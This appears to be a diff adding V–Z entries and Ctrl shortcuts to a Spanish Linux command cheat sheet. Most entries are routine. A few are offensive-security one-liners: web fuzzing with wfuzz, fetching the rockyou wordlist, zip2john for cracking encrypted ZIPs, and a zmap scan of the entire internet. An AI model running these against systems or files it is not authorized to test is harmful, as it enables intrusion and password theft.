+valgrind --tool=massif ./binario    # Perfil de uso de memoria
+valgrind --tool=memcheck --leak-check=full ./binario    # Verificar memoria
+valgrind ./programa    # Ejecutar con valgrind
+vgcreate vg0 /dev/sdb    # Crear grupo de volúmenes
+vgremove vg0    # Eliminar grupo de volúmenes
+vi archivo    # Editar con Vi
+vim + archivo    # Abrir al final
+vim +n archivo    # Abrir en línea n
+vim -O archivo1 archivo2    # Abrir en columnas verticales
+vim archivo    # Editar con Vim
+vimdiff archivo1 archivo2    # Diferencias en Vim
+vmstat -s    # Mostrar estadísticas de memoria acumuladas
+vmstat 1    # Mostrar estadísticas de memoria cada segundo
+Ctrl-V    # Insertar literalmente siguiente carácter
+w    # Mostrar usuarios conectados y qué hacen
+wall "mensaje"    # Escribir a todos los usuarios
+wall mensaje    # Enviar mensaje a todos los usuarios
+watch -d comando    # Ejecutar comando resaltando diferencias
+watch -n 1 comando    # Ejecutar comando cada segundo
+watch -n 5 'ps aux | grep apache'    # Monitorear procesos
+watch lsof -i :80    # Monitorear puerto
+wc -c archivo    # Contar bytes
+wc -l archivo    # Contar líneas
+wc -m archivo    # Contar caracteres
+wc -w archivo    # Contar palabras
+wc archivo    # Contar líneas, palabras y bytes
+wfuzz -c -z file,wordlist.txt --hc 404 http://host/FUZZ    # Fuzzing web
+wget --no-check-certificate url    # Ignorar certificado SSL
+wget -c url    # Continuar descarga interrumpida
+wget -O archivo url    # Descargar con nombre específico
+wget -q url -O -    # Descargar a stdout
+wget -r url    # Descargar recursivamente
+wget url    # Descargar archivo
+whatis comando    # Mostrar descripción corta
+whereis comando    # Mostrar ubicaciones del comando
+which comando    # Mostrar ruta del ejecutable
+who    # Mostrar usuarios conectados
+who am i    # Información de sesión actual
+whoami    # Mostrar usuario actual
+wireshark &    # Analizar tráfico (GUI)
+wordlistctl fetch rockyou    # Descargar wordlist conocida
+write user < archivo    # Enviar contenido de archivo a usuario
+write user mensaje    # Enviar mensaje a usuario
+write user pts/0    # Escribir a terminal de usuario
+Ctrl-W    # Borrar palabra hacia atrás
+xargs -0    # Null-delimited input (usar con find -print0)
+xargs -I {} comando {}    # Ejecutar comando sustituyendo {} con cada línea
+xargs -n 1 comando    # Ejecutar comando con 1 argumento a la vez
+xargs -P 4 comando    # Ejecutar comando en paralelo con 4 procesos
+xargs comando    # Ejecutar comando con argumentos desde stdin
+xcowsay "hola"    # Vaca gráfica diciendo hola
+xeyes    # Ojos que siguen el mouse
+xfs_growfs /mnt    # Redimensionar filesystem XFS
+xxd archivo    # Hex dump con xxdoctal dump
+xz archivo    # Comprimir con xz
+Ctrl-X Ctrl-E    # Editar línea en editor ($EDITOR)
+yaourt -S paquete    # Instalar desde AUR (legacy)
+yay -S paquete    # Instalar desde AUR
+yes    # Repetir 'y' infinitamente
+yes texto    # Repetir 'texto' infinitamente
+yum clean all    # Limpiar caché
+yum groupinstall "grupo"    # Instalar grupo
+yum grouplist    # Listar grupos
+yum info paquete    # Información de paquete
+yum install paquete    # Instalar paquete (RHEL/CentOS)
+yum list installed    # Listar instalados
+yum remove paquete    # Eliminar paquete
+yum repolist    # Listar repositorios
+yum search palabra    # Buscar paquete
+yum update    # Actualizar paquetes
+Ctrl-Y    # Pegar lo borrado (yank)
+zcat archivo.gz    # Mostrar contenido de gzip sin descomprimir
+zenity --info --text="Hola"    # Diálogo gráfico desde script
+zip -e archivo.zip archivos    # Crear ZIP encriptado
+zip -r archivo.zip dir    # Crear zip recursivo
+zip archivo.zip archivos    # Crear zip
+zip2john archivo.zip > hash.txt    # Preparar ZIP para John
+zipinfo archivo.zip    # Información de ZIP
+zless archivo.gz    # Paginar archivo comprimido
+zmap -p 80 0.0.0.0/0    # Scan de internet rápido
+zsh    # Iniciar zsh
+zsh script.zsh    # Ejecutar script Zsh
+zsteg imagen.png    # Análisis de esteganografía PNG
+Ctrl-Z    # Suspender proceso en primer plano
